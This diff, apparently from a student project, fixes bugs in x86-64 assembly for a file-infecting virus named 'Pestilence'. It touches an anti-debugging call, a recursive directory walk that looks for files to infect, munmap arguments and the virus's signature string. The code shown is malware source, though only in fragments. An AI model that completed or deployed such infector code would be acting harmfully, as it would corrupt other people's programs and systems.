@@ -15,8 +15,8 @@ _start:
 	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
 	; mov rsi, dir1Len
 	; call _readDir
-	call _check_debug
 	call _map_int_table
+	call _check_debug
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
@@ -123,7 +123,7 @@ _readDir:
         lea r11, FAM(pestilence.dirents_struct_ptr) 		; r11 -> ptr de la struct actuelle
         movzx r12, WORD [r10 + D_RECLEN_OFF] 			; r12 = length de la stuct dirents actuelle
         add [r8], r12d                        			; update du total lu dans r8
-        add [r11], r12                          		; pestilence.diretns_struct_ptr -> sur la prochaine struct
+        add qword [r11], r12                          		; pestilence.diretns_struct_ptr -> sur la prochaine struct
         cmp BYTE [r10 + D_TYPE], D_FOLDER
         je _recursif
         cmp BYTE [r10 + D_TYPE], D_REG_FILE 			; verifie le type du fichier
@@ -836,8 +836,8 @@ _itoa:
         ret
 mov [rsi + rcx], rax
 _unmap_close_inf:
-	lea rdi, INF(infection.map_addr)
-	lea rsi, INF(infection.map_size)
+	mov rdi, INF(infection.map_addr)
+	mov rsi, INF(infection.map_size)
 	mov rax, SYS_UNMAP
 	syscall
 	jmp _close_file_inf
@@ -884,6 +884,6 @@ headerGetLen equ $ - headerGet
 timespec:
     dq -1          ; Secondes
     dq 9999999     ; 100ms
-signature	db	"pestilence version 0.0 (c)oded by anvincen-eedy", 0x0
+signature	db	"Pestilence version 0.0 (c)oded by anvincen-eedy", 0x0
 signature_len equ $ - signature
 _end:
